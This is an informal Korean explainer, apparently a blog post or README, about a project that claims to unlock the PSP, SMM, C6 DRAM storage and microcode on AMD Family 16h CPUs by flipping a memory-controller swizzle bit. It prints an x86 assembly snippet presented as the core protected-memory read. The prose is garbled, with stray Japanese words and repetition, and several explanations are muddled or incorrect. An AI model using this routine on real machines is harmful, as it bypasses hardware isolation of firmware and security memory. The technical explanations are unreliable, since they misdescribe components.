# DRAM Spaghettifying이 뭐죠? 
 DRAM은 그냥 말 그래도 RAM인데, 이걸 스파게티처럼 휘저을 수 있다고? 
 맞음. 요즘 CPU는 메모리 접근을 위해서 MMU라는게 있는데, 이 MMU가 DRAM에 접근할 때 물리적인 주소로 바꾸는 과정이 있음.
 이 과정을 스파게티처럼 휘저는 것이 skitter-creek-bath-salts 프로젝트의 핵심임.

 ## TL;DR 
 - PSP(Platform Security Processor) 언락 
 - SMM(System Management Mode) 언락 
 - C6 DRAM 언락 
 - CPU 마이크로코드 언락 

 # PSP, SMM, C6 DRAM, 마이크로코드는 뭐임? 
 PSP는 플랫폼 보안 프로세서로, PSP는 CPU에서 실행되는 작은 프로세서로, 시스템의 보안을 담당함. 
 SMM는 시스템 관리 모드로, CPU가 시스템을 관리하기 위한 모드임. 
 C6 DRAM은 DRAM의 하나의 모드로, 저전력 모드임. 
 마이크로코드는 CPU의 명령어를 해석하기 위한 코드임. 

 # 스파게티처럼 휘저어서 뭐함? 
 PSP, SMM, C6 DRAM, 마이크로코드 등을 언락해서, 시스템의 핵심부까지 접근할 수 있게 해줌.
 이 프로젝트는 AMD Family 16h CPU에서 테스트되었음. 

 # 이 프로젝트는 어떻게 작동함? 
 이 프로젝트는 DRAM의 물리적인 주소를 바꾸는 과정을 스파게티처럼 휘저음. 
そして, 이 과정을 통해 PSP, SMM, C6 DRAM, 마이크로코드 等을 언락할 수 있음. 

 # 이 프로젝트의 취지 
 이 프로젝트는 시스템의 핵심부까지 접근할 수 있게 해주기 위한 취지로, 개발자들이 시스템의 보안을 테스트하기 위한 목적임. 

 ## 이 프로젝트의 핵심 코드 
 ``` 
 mov eax, [0xf80c2094] ; prime mmio TLB 
 mov eax, [0x6f800000] ; prime target TLB 
 pushf ; preserve flags 
 cli ; interrupts off 
 clflush [0x6f800000] ; evict the target, force the dram read 
 mfence ; barrier - no coherent world dram access 
 lfence ; reordered into spaghettified view 
 xor dword [0xf80c2094], 1<<22 ; flip dct swizzle → spaghettify dram 
 mov ebx, [0x6f800000] ; fetch target in spaghettified view 
 xor dword [0xf80c2094], 1<<22 ; restore dct swizzle → unscramble 
 mfence ; barrier - no spaghettified dram access 
 lfence ; reordered into coherent world view 
 popf ; interrupts back on 
 ``` 

 ## 결론 
 요약하자면, 이 프로젝트는 DRAM을 스파게티처럼 휘저을 수 있는 프로젝트로, 시스템의 핵심부까지 접근할 수 있게 해줌. 
이 프로젝트는 개발자들이 시스템의 보안을 테스트하기 위한 목적으로 만들어졌으며, AMD Family 16h CPU에서 테스트되었음. 
개빡치는 점은, 이 프로젝트가 시스템의 핵심부까지 접근할 수 있게 해주는데, 이것은 거의 모든 Protected Memory Region에 접근할 수 있는 것을 의미함.
